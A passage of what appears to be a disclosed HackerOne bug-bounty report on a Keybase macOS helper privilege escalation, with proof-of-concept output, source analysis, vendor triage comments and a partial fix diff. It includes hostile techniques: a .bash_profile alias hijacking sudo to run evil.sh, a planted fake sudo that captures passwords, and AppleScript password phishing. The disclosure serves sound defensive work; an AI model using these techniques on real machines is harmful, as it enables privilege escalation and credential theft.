class=\"o\"\u003e)\u003c/span\u003e,204\u003cspan class=\"o\"\u003e(\u003c/span\u003e_developer\u003cspan class=\"o\"\u003e)\u003c/span\u003e,250\u003cspan class=\"o\"\u003e(\u003c/span\u003e_analyticsusers\u003cspan class=\"o\"\u003e)\u003c/span\u003e,395\u003cspan class=\"o\"\u003e(\u003c/span\u003ecom.apple.access_ftp\u003cspan class=\"o\"\u003e)\u003c/span\u003e,398\u003cspan class=\"o\"\u003e(\u003c/span\u003ecom.apple.access_screensharing\u003cspan class=\"o\"\u003e)\u003c/span\u003e,399\u003cspan class=\"o\"\u003e(\u003c/span\u003ecom.apple.access_ssh\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n➜  ~ keybase\nNAME:\nkeybase - Keybase \u003cspan class=\"nb\"\u003ecommand \u003c/span\u003eline client.\n\u003cspan class=\"o\"\u003e[\u003c/span\u003eREMOVED]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCheck the \u003ccode\u003e/tmp/out\u003c/code\u003e file. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ebash-3.2\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003ecat\u003c/span\u003e /tmp/out\n\u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e501\u003cspan class=\"o\"\u003e(\u003c/span\u003eu3mur4\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"nv\"\u003egid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e20\u003cspan class=\"o\"\u003e(\u003c/span\u003estaff\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003egroups\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e20\u003cspan class=\"o\"\u003e(\u003c/span\u003estaff\u003cspan class=\"o\"\u003e)\u003c/span\u003e,12\u003cspan class=\"o\"\u003e(\u003c/span\u003eeveryone\u003cspan class=\"o\"\u003e)\u003c/span\u003e,61\u003cspan class=\"o\"\u003e(\u003c/span\u003elocalaccounts\u003cspan class=\"o\"\u003e)\u003c/span\u003e,79\u003cspan class=\"o\"\u003e(\u003c/span\u003e_appserverusr\u003cspan class=\"o\"\u003e)\u003c/span\u003e,80\u003cspan class=\"o\"\u003e(\u003c/span\u003eadmin\u003cspan class=\"o\"\u003e)\u003c/span\u003e,81\u003cspan class=\"o\"\u003e(\u003c/span\u003e_appserveradm\u003cspan class=\"o\"\u003e)\u003c/span\u003e,98\u003cspan class=\"o\"\u003e(\u003c/span\u003e_lpadmin\u003cspan class=\"o\"\u003e)\u003c/span\u003e,702\u003cspan class=\"o\"\u003e(\u003c/span\u003e2\u003cspan class=\"o\"\u003e)\u003c/span\u003e,701\u003cspan class=\"o\"\u003e(\u003c/span\u003e1\u003cspan class=\"o\"\u003e)\u003c/span\u003e,33\u003cspan class=\"o\"\u003e(\u003c/span\u003e_appstore\u003cspan class=\"o\"\u003e)\u003c/span\u003e,100\u003cspan class=\"o\"\u003e(\u003c/span\u003e_lpoperator\u003cspan class=\"o\"\u003e)\u003c/span\u003e,204\u003cspan class=\"o\"\u003e(\u003c/span\u003e_developer\u003cspan class=\"o\"\u003e)\u003c/span\u003e,250\u003cspan class=\"o\"\u003e(\u003c/span\u003e_analyticsusers\u003cspan class=\"o\"\u003e)\u003c/span\u003e,395\u003cspan class=\"o\"\u003e(\u003c/span\u003ecom.apple.access_ftp\u003cspan class=\"o\"\u003e)\u003c/span\u003e,398\u003cspan class=\"o\"\u003e(\u003c/span\u003ecom.apple.access_screensharing\u003cspan class=\"o\"\u003e)\u003c/span\u003e,399\u003cspan class=\"o\"\u003e(\u003c/span\u003ecom.apple.access_ssh\u003cspan class=\"o\"\u003e)\u003c/span\u003e\nbash-3.2\u003cspan class=\"err\"\u003e$\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp\u003eNotice that the \u003ccode\u003eu3mur4\u003c/code\u003e account executed our binary because we could change the symlinks in the \u003ccode\u003e/usr/local/bin\u003c/code\u003e directory. From now on we can access any file and run arbitrary command as the targeted account. Also we can access the \u003ccode\u003eprivate\u003c/code\u003e keybase folder of the user and other sensitive data.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eHow to become root?\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eBecause we can run arbitrary code as the targeted user we have multiple ways to achieve root privileges. By using misconfigurations with a little bit of social engineering you can get your victim to escalate you to root without realizing it.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003eBy adding this line to the users .bash_profile: \u003ccode\u003ealias sudo=\u0026#39;sudo sh -c \u0026#39;\\\u0026#39;\u0026#39;evil.sh \u0026amp; exec \u0026quot;$@\u0026quot;\u0026#39;\\\u0026#39;\u0026#39; sh\u0026#39;\u003c/code\u003e. We can change the behavior of what happens when the user runs “sudo”.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eAppleScript is fairly simple, and can be used to phish for passwords for nearly anything.  If you can acquire the password of an administrator user, you can escalate to root. So when the user runs the keybase binary we can create a popup that the \u0026#39;keybase helper need to update...\u0026#39; and the user have to enter the password.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eThis will work up until El Capitan: The sudoers policy caches credentials for 5 minutes, unless overridden in sudoers(5). What this means is that once a user runs sudo, they can run a command with sudo again for up to 5 minutes without having to enter their password again.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eShort version (see source 2): Homebrew changes the permissions on \u003ccode\u003e/usr/local/bin\u003c/code\u003e to the user (or any process running as the user) is able to write files to it and give those files executable permissions. Now if you (or someone else, or some other program) were to place a program called sudo in /usr/local/bin, then every time you typed sudo it would be that program that would be executed, not the real one.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eetc...\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fwww.n00py.io%2F2016%2F10%2Fprivilege-escalation-on-os-x-without-exploits%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003esource1 - privilege-escalation-on-os-x-without-exploits\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fapplehelpwriter.com%2F2018%2F03%2F21%2Fhow-homebrew-invites-users-to-get-pwned%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003esource2 - how-homebrew-invites-users-to-get-pwned\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"why-can-we-change-the-symlinks\"\u003eWhy can we change the symlinks?\u003c/h1\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ethe 3th item is the most important\u003c/strong\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eIn the \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fkeybase%2Fclient%2Fblob%2Fmaster%2Fosx%2FInstaller%2FOptions.m%23L125\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eclient/osx/Installer/Options.m:125\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e file\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eNSString *servicePath = [self.appPath stringByAppendingPathComponent:@\u0026quot;Contents/SharedSupport/bin\u0026quot;];\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ethe code appends the \u003ccode\u003eContents/SharedSupport/bin\u003c/code\u003e path to the specified appPath. We specified appPath in step 2 as \u003ccode\u003e/Applications/Keybase.app/../../var/tmp/poc\u003c/code\u003e. After appending the path, the servicePath becomes \u003ccode\u003e/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin\u003c/code\u003e which resolves to \u003ccode\u003e/var/tmp/poc/Contents/SharedSupport/bin\u003c/code\u003e. That is why we created the directory structure specified in step 2.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eIn the \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fkeybase%2Fclient%2Fblob%2Fmaster%2Fosx%2FKBKit%2FKBKit%2FComponent%2FKBCommandLine.m%23L26\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eclient/osx/KBKit/KBKit/Component/KBCommandLine.m:26\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e file\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e...\nif (![self.config isInApplications:self.servicePath]) {\ncompletion(KBMakeWarning(@\u0026quot;Command line install is not supported from this location: %@\u0026quot;, self.servicePath));\nreturn;\n}\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ethe code checks that the servicePath start with \u003ccode\u003e/Application\u003c/code\u003e. That is why we specify the \u003ccode\u003e/Application...\u003c/code\u003e appPath with the \u003ccode\u003e../..\u003c/code\u003e components in step 3.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eIn the \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fkeybase%2Fclient%2Fblob%2Fmaster%2Fosx%2FHelper%2FKBHelper.m%23L371\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eclient/osx/Helper/KBHelper.m:371\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e file the \u003ccode\u003einstall\u003c/code\u003e function will call the \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fkeybase%2Fclient%2Fblob%2Fmaster%2Fosx%2FHelper%2Ffs.m%23L71-L91\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003echeckAbsolutePath\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e function with \u003ccode\u003epath=/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase\u003c/code\u003e and \u003ccode\u003eprefix=/Applications/Keybase.app\u003c/code\u003e arguments.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/*\n* check that the path path has the prefix prefix, being wise to\n* whatever attacks people will throw at us, like /a/b/../../.., etc\n*/\n+(BOOL)checkAbsolutePath:(NSString *)path hasAbsolutePrefix:(NSString *)prefix {\nif (!prefix.absolutePath) {\n    return NO;\n}\nif (!path.absolutePath) {\n    return NO;\n}\nNSArray *a = [path.stringByStandardizingPath componentsSeparatedByString:@\u0026quot;/\u0026quot;];\nNSArray *b = [prefix.stringByStandardizingPath componentsSeparatedByString:@\u0026quot;/\u0026quot;];\nif (a.count \u0026lt; b.count) {\n    return NO;\n}\n\nfor (int i = 0; i \u0026lt; b.count; i++) {\n    if (![a[i] isEqualToString:b[i]]) {\n        return NO;\n    }\n}\nreturn YES;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003ea\u003c/code\u003e (path) array becomes \u003ccode\u003e[\u0026quot;\u0026quot;, Application, \u0026quot;Keybase.app\u0026quot;, Contents, SharedSupport, bin, keybase]\u003c/code\u003e. \u003cstrong\u003eSo the stringByStandardizingPath function will resolves the /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase link\u003c/strong\u003e that is why it will start as the b \u003ccode\u003e[\u0026quot;\u0026quot;, Application, \u0026quot;Keybase.app\u0026quot;]\u003c/code\u003e array. The function will return \u003ccode\u003eYES\u003c/code\u003e and the add \u003ccode\u003eaddToPath\u003c/code\u003e function will create the link.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eIn the \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fkeybase%2Fclient%2Fblob%2Fmaster%2Fosx%2FKBKit%2FKBKit%2FComponent%2FKBCommandLine.m%23L125-L137\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eclient/osx/KBKit/KBKit/Component/KBCommandLine.m:125-137\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e file\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e- (BOOL)linkedToServicePath {\nNSString *linkDir = @\u0026quot;/usr/local/bin\u0026quot;;\nNSString *linkPath = [NSString stringWithFormat:@\u0026quot;%@/%@\u0026quot;, linkDir, self.config.serviceBinName];\nNSString *shouldResolveToPath = [NSString stringWithFormat:@\u0026quot;%@/%@\u0026quot;, self.servicePath, self.config.serviceBinName];\nif ([NSFileManager.defaultManager fileExistsAtPath:linkDir]) {\nNSString *resolved = [self resolveLinkPath:linkPath];\nDDLogInfo(@\u0026quot;Link resolved to path: %@ \u0026lt;=\u0026gt; %@\u0026quot;, resolved, shouldResolveToPath);\nif ([resolved isEqualToString:shouldResolveToPath]) {\n  return YES;\n}\n}\nreturn NO;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ethe code checks that \u003ccode\u003e/usr/local/bin\u003c/code\u003e + \u003ccode\u003eserviceBinName\u003c/code\u003e link resolves to the same place as our specified \u003ccode\u003eservicePath\u003c/code\u003e (appPath + Contents/SharedSupport/bin) + \u003ccode\u003eserviceBinName\u003c/code\u003e. That is why we created two symlink to the original binaries in step 2.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eNotice that we have permission to remove, modify later this link, (in step 4 and 5).\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eUnauthorized access is possible which impacts the confidentially, integrity, and availability of the system.\u003c/p\u003e\n","bounty_amount":"750.0","formatted_bounty":"$750","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":47,"voters":["superhero1","u3mur4","base_64","andirrahmani","prophet","metnew","mygf","icanthack","aryan2808","7yr","and 37 more..."],"severity":{"rating":"medium","score":6.1,"author_type":"Team","metrics":{"attack_vector":"local","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"changed","confidentiality":"low","integrity":"low","availability":"low"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4032460,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the report and the detailed write-up, we'll take a look soon.","markdown_message":"\u003cp\u003eThanks for the report and the detailed write-up, we\u0026#39;ll take a look soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-24T17:57:33.875Z","updated_at":"2019-01-24T17:57:33.875Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4033055,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-24T19:52:30.922Z","updated_at":"2019-01-24T19:52:30.922Z","additional_data":{"old_severity":"High (8.6)","new_severity":"Medium (6.1)","old_severity_id":285804,"new_severity_id":285875},"actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4033063,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Repro'ed. This is a great find and a great description, thank you! I don't think it deserves to be \"high\" though since it doesn't get root, it just allows nobody to escalate to a user account. Some other shenanigans outside our control are needed to get all the way to root. I'll work on a fix right away. I'm annoyed that I thought this was an attack vector (as per my comment) but then failed to properly check for this attack. Thanks for reading the code and not the comments!","markdown_message":"\u003cp\u003eRepro\u0026#39;ed. This is a great find and a great description, thank you! I don\u0026#39;t think it deserves to be \u0026quot;high\u0026quot; though since it doesn\u0026#39;t get root, it just allows nobody to escalate to a user account. Some other shenanigans outside our control are needed to get all the way to root. I\u0026#39;ll work on a fix right away. I\u0026#39;m annoyed that I thought this was an attack vector (as per my comment) but then failed to properly check for this attack. Thanks for reading the code and not the comments!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-24T19:54:30.047Z","updated_at":"2019-01-24T19:54:30.047Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4033191,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your kind words regarding my description. You are right, we 'just' escalate to a user account but from there it is very easy to get root permission. Just place a script named as `sudo `  in the `/usr/local/bin` directory and wait for the user to run the `sudo` command. Our `sudo` scripts reads the user password, then it prints that is was wrong then runs the real `sudo` binary or something like that. I think sometimes we don't even need that if the user was already the `root`. Even if we don't get root permission we can access lot of personal information.\n\nSorry for the blah blah just my brain is thinking on how to be a root user :D","markdown_message":"\u003cp\u003eThank you for your kind words regarding my description. You are right, we \u0026#39;just\u0026#39; escalate to a user account but from there it is very easy to get root permission. Just place a script named as \u003ccode\u003esudo\u003c/code\u003e  in the \u003ccode\u003e/usr/local/bin\u003c/code\u003e directory and wait for the user to run the \u003ccode\u003esudo\u003c/code\u003e command. Our \u003ccode\u003esudo\u003c/code\u003e scripts reads the user password, then it prints that is was wrong then runs the real \u003ccode\u003esudo\u003c/code\u003e binary or something like that. I think sometimes we don\u0026#39;t even need that if the user was already the \u003ccode\u003eroot\u003c/code\u003e. Even if we don\u0026#39;t get root permission we can access lot of personal information.\u003c/p\u003e\n\n\u003cp\u003eSorry for the blah blah just my brain is thinking on how to be a root user :D\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-24T20:24:05.533Z","updated_at":"2019-01-24T20:24:05.533Z","actor":{"username":"u3mur4","cleared":false,"url":"/u3mur4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/449/470/1f5148d87050c9c48970956ff5160260dcd451c2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4033209,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"But you could also do the same with access to a user's `.bashrc` file --- just alias `sudo` to `evilsudo` which writes the password down and then runs `sudo`.  Plus on most people's Mac's, the admin user owns `/usr/local/bin`, so that you can run `brew` without `root`, let's say.","markdown_message":"\u003cp\u003eBut you could also do the same with access to a user\u0026#39;s \u003ccode\u003e.bashrc\u003c/code\u003e file --- just alias \u003ccode\u003esudo\u003c/code\u003e to \u003ccode\u003eevilsudo\u003c/code\u003e which writes the password down and then runs \u003ccode\u003esudo\u003c/code\u003e.  Plus on most people\u0026#39;s Mac\u0026#39;s, the admin user owns \u003ccode\u003e/usr/local/bin\u003c/code\u003e, so that you can run \u003ccode\u003ebrew\u003c/code\u003e without \u003ccode\u003eroot\u003c/code\u003e, let\u0026#39;s say.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-24T20:28:11.576Z","updated_at":"2019-01-24T20:28:11.576Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4033316,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yeah, I wrote almost that version in the first point in the `How to become root?` chapter.\n**You are right**, we need to wait it until the user runs the `sudo` command or we need to use some social engineering trick to force it. Like our `git-remote-keybase` script could be something like this (or any other command)\n```bash\nsudo bash -c \"/Applictions/Keybase.app/....../git-remote-keybase $@ \u0026\u0026 id \u003e\u003e /tmp/out\"\n```\nSo when the user wants to clone,push,etc... from keybase://repo it will ask for password. It is may be suspicious, but the user cannot proceed without entering the password.","markdown_message":"\u003cp\u003eYeah, I wrote almost that version in the first point in the \u003ccode\u003eHow to become root?\u003c/code\u003e chapter.\u003cbr\u003e\n\u003cstrong\u003eYou are right\u003c/strong\u003e, we need to wait it until the user runs the \u003ccode\u003esudo\u003c/code\u003e command or we need to use some social engineering trick to force it. Like our \u003ccode\u003egit-remote-keybase\u003c/code\u003e script could be something like this (or any other command)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003esudo \u003c/span\u003ebash \u003cspan class=\"nt\"\u003e-c\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;/Applictions/Keybase.app/....../git-remote-keybase \u003c/span\u003e\u003cspan class=\"nv\"\u003e$@\u003c/span\u003e\u003cspan class=\"s2\"\u003e \u0026amp;\u0026amp; id \u0026gt;\u0026gt; /tmp/out\u0026quot;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo when the user wants to clone,push,etc... from keybase://repo it will ask for password. It is may be suspicious, but the user cannot proceed without entering the password.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-24T20:52:18.433Z","updated_at":"2019-01-24T20:52:18.433Z","actor":{"username":"u3mur4","cleared":false,"url":"/u3mur4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/449/470/1f5148d87050c9c48970956ff5160260dcd451c2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4042027,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you again for this excellent research. We've fixed the issue in our latest admin builds.  The problem was as you described. But I was bewildered since I knew I had tested attacks like the one you mentioned. What I got wrong was that `stringByStandardizingPath` acts *differently* depending on whether you give it a test string (`/a/b/../../d/`) versus a real path; it will resolve the symlinks in the real path, as you describe above. Our fix is just to look for fishy path components like `..` or `~` and to reject any paths with these components. We'll bounty and close the issue after our next release goes out, which should be the week of Feb 5.\n\n","markdown_message":"\u003cp\u003eThank you again for this excellent research. We\u0026#39;ve fixed the issue in our latest admin builds.  The problem was as you described. But I was bewildered since I knew I had tested attacks like the one you mentioned. What I got wrong was that \u003ccode\u003estringByStandardizingPath\u003c/code\u003e acts \u003cem\u003edifferently\u003c/em\u003e depending on whether you give it a test string (\u003ccode\u003e/a/b/../../d/\u003c/code\u003e) versus a real path; it will resolve the symlinks in the real path, as you describe above. Our fix is just to look for fishy path components like \u003ccode\u003e..\u003c/code\u003e or \u003ccode\u003e~\u003c/code\u003e and to reject any paths with these components. We\u0026#39;ll bounty and close the issue after our next release goes out, which should be the week of Feb 5.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-26T00:52:16.119Z","updated_at":"2019-01-26T00:52:16.119Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4043492,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think it doesn't act differently. After `stringByStandardizingPath`  standardizes the path it checks that the resulting path (`/var/tmp/Contents/SharedSupport/bin/keybase`) is a symbolic link or not. If it is a link it resolves the link. So the important part is that the path is a link, not that it is a real or a bogus path.  But this is just a mere detail.\nCan I somehow test the patched version or I have to wait for the next release?","markdown_message":"\u003cp\u003eI think it doesn\u0026#39;t act differently. After \u003ccode\u003estringByStandardizingPath\u003c/code\u003e  standardizes the path it checks that the resulting path (\u003ccode\u003e/var/tmp/Contents/SharedSupport/bin/keybase\u003c/code\u003e) is a symbolic link or not. If it is a link it resolves the link. So the important part is that the path is a link, not that it is a real or a bogus path.  But this is just a mere detail.\u003cbr\u003e\nCan I somehow test the patched version or I have to wait for the next release?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-26T11:42:34.368Z","updated_at":"2019-01-26T11:42:34.368Z","actor":{"username":"u3mur4","cleared":false,"url":"/u3mur4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/449/470/1f5148d87050c9c48970956ff5160260dcd451c2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4050450,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's the patch, it's fixed twice:\n\n```\ndiff --git a/osx/Helper/Info.plist b/osx/Helper/Info.plist\nindex 5d87712bde..b3eef1e9a3 100644\n--- a/osx/Helper/Info.plist\n+++ b/osx/Helper/Info.plist\n@@ -9,11 +9,11 @@\n \t\u003ckey\u003eCFBundleName\u003c/key\u003e\n \t\u003cstring\u003eHelper\u003c/string\u003e\n \t\u003ckey\u003eCFBundleVersion\u003c/key\u003e\n-\t\u003cstring\u003e1.0.35\u003c/string\u003e\n+\t\u003cstring\u003e1.0.36\u003c/string\u003e\n \t\u003ckey\u003eKBBuild\u003c/key\u003e\n \t\u003cstring\u003e3\u003c/string\u003e\n \t\u003ckey\u003eCFBundleShortVersionString\u003c/key\u003e\n-\t\u003cstring\u003e1.0.35\u003c/string\u003e\n+\t\u003cstring\u003e1.0.36\u003c/string\u003e\n \t\u003ckey\u003eSMAuthorizedClients\u003c/key\u003e\n \t\u003carray\u003e\n \t\t\u003cstring\u003eanchor apple generic and (certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = \u0026quot;99229SGT5K\u0026quot;) and (identifier \u0026quot;keybase.Installer2\u0026quot; or identifier \u0026quot;keybase.Keybase\u0026quot;)\u003c/string\u003e\ndiff --git a/osx/Helper/KBHelper.m b/osx/Helper/KBHelper.m\nindex 745a772f5a..c0342e19c9 100644\n--- a/osx/Helper/KBHelper.m\n+++ b/osx/Helper/KBHelper.m\n@@ -176,6 +176,9 @@ -(BOOL)_isStandardKeybaseMountPath:(NSString*)path{\n   if (!p.absolutePath) {\n     return NO;\n   }\n+  if ([KBFSUtils checkIfPathIsFishy:path]) {\n+    return NO;\n+  }\n   NSArray *a = [p componentsSeparatedByString:@\"/\"];\n   if (a.count != 3) {\n     return NO;\n@@ -385,7 +388,6 @@ - (void)addToPath:(NSString *)directory name:(NSString *)name appName:(NSString\n     NSString *neededPrefix = @\"/Applications/Keybase.app\";\n \n     if ([KBFSUtils checkAbsolutePath:path hasAbsolutePrefix:neededPrefix]) {\n-\n       KBLog(@\"Allowing creation of symlink %@ -\u003e %@ since it's in %@\", linkPath, path, neededPrefix);\n \n       // Fix the link\ndiff --git a/osx/Helper/fs.h b/osx/Helper/fs.h\nindex 49ffa3f488..1e5252da2d 100644\n--- a/osx/Helper/fs.h\n+++ b/osx/Helper/fs.h\n@@ -8,5 +8,6 @@\n +(BOOL)checkFile:(NSString *)linkPath isType:(NSFileAttributeType)fileType;\n +(void)checkKeybaseResource:(NSURL *)bin identifier:(NSString *)identifier error:(NSError **)error;\n +(BOOL)checkAbsolutePath:(NSString *)path hasAbsolutePrefix:(NSString *)prefix;\n++(BOOL)checkIfPathIsFishy:(NSString *)path;\n \n @end\ndiff --git a/osx/Helper/fs.m b/osx/Helper/fs.m\nindex f60e54b7ea..9046e16ec7 100644\n--- a/osx/Helper/fs.m\n+++ b/osx/Helper/fs.m\n@@ -64,6 +64,27 @@ +(void)checkKeybaseResource:(NSURL *)bin identifier:(NSString *)identifier error\n     if (keybaseRequirement) CFRelease(keybaseRequirement);\n }\n \n++(BOOL)checkIfPathIsFishy:(NSString *)path {\n+    NSArray *v = [path componentsSeparatedByString:@\"/\"];\n+    for (int i = 0; i \u003c v.count; i++) {\n+        if ([v[i] isEqualToString:@\"..\"]) {\n+            return YES;\n+        }\n+    